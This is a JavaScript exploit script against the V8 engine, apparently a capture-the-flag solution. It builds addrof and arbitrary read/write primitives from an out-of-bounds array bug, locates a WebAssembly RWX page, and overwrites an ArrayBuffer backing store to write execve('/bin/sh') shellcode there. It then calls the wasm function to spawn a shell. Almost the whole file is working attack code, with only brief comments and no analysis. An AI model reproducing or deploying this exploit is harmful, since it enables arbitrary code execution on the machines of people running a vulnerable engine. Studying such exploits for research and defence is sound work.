var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) == float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) == BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

a = [1.1, 2.2, 3.3];
b = [{A:1}, {B:2}, {C:3}];

var float_arr = a.slice(0);
var obj_arr = b.slice(0);



float_elements_addr = ftoi(float_arr[4]);
console.log("[+] float element addr = "+(float_elements_addr).toString(16));

// %DebugPrint(float_arr); // buffer : 0x154008084df9
// %DebugPrint(obj_arr); // buffer : 0x154008084e29

obj_elements_addr = float_elements_addr - 0x154008084df9n + 0x154008084e29n;
console.log("[+] obj elements addr = "+(obj_elements_addr).toString(16));

// hijack obj element ptr
float_arr[4]= itof(obj_elements_addr);
// %DebugPrint(float_arr);
// %SystemBreak();

function addrof(in_obj) {
    // put the obj into our object array
    obj_arr[0] = in_obj;

    // accessing the first element of the float array
    // treats the value there as a float:
    let addr = float_arr[0];

    // Convert to bigint
    return ftoi(addr);
}


// %DebugPrint(a); // buffer : 0x154008084e29

console.log("[+] check addr of a = 0x"+(addrof(a)).toString(16));


function arbi_r(target_addr){
    t=[1.1]
    // read is performed at addr + 0x8
    target_addr = target_addr - 0x8n

    // ensure addr is tagged as a pointer
    if (target_addr % 2n == 0) {
        target_addr += 1n;
    }
    
    hijacked_t = t.slice(0);
    hijacked_t[2]=itof(target_addr);

    return ftoi(hijacked_t[0]);

}

function arbi_w(target_addr, val) { // both as BigInts
    t = [1.1]

    // write is made at addr + 0x8
    target_addr = target_addr - 0x8n

    // ensure addr is tagged
    if (target_addr % 2n == 0) {
        target_addr += 1n;
    }

    tmp_arr = t.slice(0)
    // set elem ptr to desired address
    tmp_arr[2] = itof(target_addr)

    // set addr to desired value
    tmp_arr[0] = itof(val)
}


var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,140,128,128,128,0,1,134,128,128,128,0,1,1,127,32,0,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var wasm_func = wasm_instance.exports.main;

// %DebugPrint(wasm_instance);

// 0x360c082117b8-0x360c08211750 ( rxw_code_ptr -wasm_instance) = 0x68

var addr_to_read = addrof(wasm_instance) + 0x68n;
var rwx = arbi_r(addr_to_read)

console.log("[+] rwx addr = 0x"+(rwx).toString(16));

// writing shelcode

// shellcode = [0x6a,0x68,0x68,0x2f,0x2f,0x2f,0x73,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x68,0x1,0x1,0x1,0x1,0x81,0x34,0x24,0x72,0x69,0x1,0x1,0x31,0xc9,0x51,0x6a,0x4,0x59,0x1,0xe1,0x51,0x89,0xe1,0x31,0xd2,0x6a,0xb,0x58,0xcd,0x80,];
var shellcode = [0x48, 0xC7, 0xC0, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0xB9, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x51, 0x48, 0x89, 0xE7, 0x0F, 0x05]

var buf = new ArrayBuffer(0x100);
var uint8_arr = new Uint8Array(buf);
var buf_addr = addrof(buf);

// %DebugPrint(buf);
// %SystemBreak();
// offset to backing store ptr at 0x60
var backing_addr = buf_addr + 0x60n

// overwrite backing store ptr so all uint8_arr access happen in the rwx segment
arbi_w(backing_addr, rwx)

// backing store now points to the rwx segment, copy in our shellcode
for (let i = 0; i < shellcode.length; i++) {
    uint8_arr[i] = shellcode[i]
}

console.log("Writing finish");

// get shell
// %DebugPrint(wasm_func);
// %SystemBreak();
wasm_func();

// %SystemBreak();